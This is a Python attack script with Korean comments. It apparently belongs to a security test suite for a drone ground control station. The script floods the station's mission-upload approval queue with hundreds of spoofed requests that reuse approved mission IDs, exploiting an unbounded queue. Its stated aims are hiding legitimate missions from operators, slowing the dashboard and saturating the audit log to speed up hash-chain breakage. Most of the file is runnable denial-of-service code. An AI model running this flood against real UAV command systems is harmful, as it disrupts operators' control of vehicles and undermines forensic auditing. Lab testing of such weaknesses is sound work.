"""
Mission Upload Queue Exhaustion — 미션 큐 고갈 공격
독창 시나리오 #13 | NDSS 2024 "Resource Exhaustion in UAV C2 Systems"

GCS 취약점: state.py request_mission_upload()
  mission_upload_queue[upload_id] = upload  ← 크기 제한 없는 dict
  각 요청마다 새 uuid4() upload_id 생성 → 무한 추가

공격 전략:
  승인된 mission_id로 같은 요청을 수백 건 반복 제출
  → 승인 큐가 폭주 → 정상 미션이 잡음 속에 묻힘
  → 대용량 JSON 응답 → 대시보드 렌더링 지연
  → 감사 로그 포화 → hash chain 단절 가속 (시나리오 14 연계)

결과:
  - 운용자가 1000건 대기 중 정상 미션 식별 불가
  - GET /api/mission-uploads 응답이 MB 단위로 커져 클라이언트 지연
  - 감사 로그 이벤트 급증 → 포렌식 속도 저하
"""
from __future__ import annotations

import argparse
import time
from .common import GcsClient, wait_for_gcs

# 정찰 단계(시나리오 11)에서 확인된 승인된 미션 ID 목록
APPROVED_MISSIONS = [
    "dronebot-local-recon",
    "ugv-convoy-route-clearance",
]


def _flood_mission_queue(
    client: GcsClient,
    mission_id: str,
    count: int,
    burst_delay: float = 0.05,
) -> int:
    """미션 업로드 요청 count건 연속 제출, 성공 건수 반환"""
    success = 0
    for i in range(count):
        try:
            client.post("/api/mission-uploads/request", {
                "mission_id":   mission_id,
                "requested_by": f"attacker-flood-{i:04d}",
            })
            success += 1
            if (i + 1) % 50 == 0:
                print(f"[mq_exhaust] {mission_id} → {i+1}/{count}건 제출", flush=True)
        except Exception as e:
            if i == 0:
                print(f"[mq_exhaust] 제출 오류: {e}", flush=True)
        time.sleep(burst_delay)
    return success


def _check_queue_size(client: GcsClient) -> int:
    """현재 미션 큐 크기 확인"""
    try:
        resp = client.get("/api/mission-uploads")
        uploads = resp.get("payload", resp).get("mission_uploads", [])
        return len(uploads)
    except Exception:
        return -1


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Mission Upload Queue Exhaustion 공격")
    parser.add_argument("--service-url",    default="http://dah-gcs:8080")
    parser.add_argument("--burst-count",    type=int, default=200,
                        help="회당 제출 건수")
    parser.add_argument("--burst-rounds",   type=int, default=3,
                        help="버스트 라운드 수")
    parser.add_argument("--burst-delay-s",  type=float, default=0.03,
                        help="버스트 내 요청 간격 (s)")
    parser.add_argument("--round-pause-s",  type=float, default=5.0,
                        help="라운드 간 휴지 (s)")
    parser.add_argument("--duration-s",     type=float, default=90.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    print(
        f"[mq_exhaust] Mission Queue Exhaustion 시작\n"
        f"  목표: {args.burst_count}건 × {args.burst_rounds}라운드 = "
        f"{args.burst_count * args.burst_rounds}건 총 제출\n"
        f"  대상 미션: {APPROVED_MISSIONS}",
        flush=True,
    )

    baseline = _check_queue_size(client)
    print(f"[mq_exhaust] 공격 전 큐 크기: {baseline}건", flush=True)

    start = time.time()
    total_success = 0

    for rnd in range(args.burst_rounds):
        if (time.time() - start) >= args.duration_s:
            break

        print(f"\n[mq_exhaust] ── 라운드 {rnd + 1}/{args.burst_rounds} ──", flush=True)

        for mission_id in APPROVED_MISSIONS:
            n = args.burst_count // len(APPROVED_MISSIONS)
            s = _flood_mission_queue(client, mission_id, n, args.burst_delay_s)
            total_success += s
            print(f"[mq_exhaust] {mission_id}: {s}건 성공", flush=True)

        qsize = _check_queue_size(client)
        print(
            f"[mq_exhaust] 라운드 {rnd+1} 완료 — 큐 크기: {qsize}건 | 총 성공: {total_success}건",
            flush=True,
        )

        if rnd < args.burst_rounds - 1:
            time.sleep(args.round_pause_s)

    final_size = _check_queue_size(client)
    print(
        f"\n[mq_exhaust] ★ 공격 완료\n"
        f"  초기 큐: {baseline}건 → 최종: {final_size}건 (증가: {final_size - baseline}건)\n"
        f"  총 성공 제출: {total_success}건",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
